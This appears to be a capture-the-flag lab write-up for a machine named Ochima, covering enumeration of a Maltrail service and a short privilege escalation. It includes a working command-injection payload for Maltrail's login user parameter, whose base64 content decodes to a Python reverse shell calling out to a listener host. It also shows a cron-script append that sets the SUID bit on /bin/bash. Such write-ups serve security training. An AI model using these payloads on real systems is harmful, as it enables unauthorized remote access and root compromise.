# Ochima

I start off by enumerating for services:

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

I go on port 8338 and see a mailtrail service with a version number:

<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

i try to login with default credentials but without success so i look for known exploits ->

{% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}

which does not work so i try looking for other default credentials and i manage to login with admin:"changeme!" ... woops bad enumeration

So after enumeration i don't manage to find any interesting features so i go back on the exploit (bad enumeration here damn) and i look at what does the exploit, and i start to understand why it does not work so i do it by hand and end up making a working payload ->

```
;`echo+\"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNDkuNTEiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=\"+|+base64+-d+|+sh`
```

That i needed to inject in the user parameter during the POST request to /login and had to have my listener on port 80

So i get my shell and launch linpeas and find some interesting backup files that are writable ->

<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

that looks like a smelly root cronjob![](<../../../.gitbook/assets/image (114).png>)

so i hit the script with a:

```
echo "chmod +s /bin/bash" >> /var/backups/etc_Backup.sh
```

<figure><img src="../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

damn i'm starting to get a hold of cronjobs letsgo
